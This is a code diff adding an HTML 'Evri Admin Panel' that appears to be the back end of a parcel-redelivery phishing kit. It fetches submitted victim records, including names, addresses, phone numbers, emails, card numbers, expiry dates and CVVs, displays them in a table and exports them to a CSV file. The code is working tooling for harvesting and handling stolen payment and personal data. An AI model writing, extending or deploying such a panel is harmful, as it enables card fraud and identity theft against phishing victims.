@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Evri Admin Panel</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {font-family: Arial; background: #f9f9f9; padding:30px;}
+    table {width:100%; border-collapse:collapse;}
+    td,th {border:1px solid #ccc; padding:7px;}
+    th {background:#007bc4; color:#fff;}
+    h2 {color:#007bc4;}
+    button {padding:11px 18px;}
+  </style>
+</head>
+<body>
+  <h2>Redelivery Submissions - Last 30 Days</h2>
+  <table id="data"></table>
+  <button onclick="downloadCSV()">Export CSV for Edexcel</button>
+  <script>
+    fetch('/admin-data').then(r=>r.json()).then(data=>{
+      let keys = ['firstName','lastName','addr1','addr2','postcode','email','phone','deliveryDate','cardnum','exp','cvv','submitted'];
+      let table = document.getElementById('data');
+      table.innerHTML='<tr>'+keys.map(k=>"<th>"+k+"</th>").join('')+'</tr>'+
+        data.map(d=>'<tr>'+keys.map(k=>"<td>"+(d[k]||'')+"</td>").join('')+'</tr>').join('');
+      window.downloadCSV=function(){ 
+        let csv = keys.join(',')+'\n'+data.map(d=>keys.map(k=>'"'+(d[k]||'').replace(/"/g,'""')+'"').join(',')).join('\n');
+        let blob = new Blob([csv],{type:'text/csv'});
+        let a = document.createElement('a');
+        a.href=URL.createObjectURL(blob);
+        a.download='evri-redelivery.csv';
+        a.click();
+      }
+    });
+  </script>
+</body>
+</html>
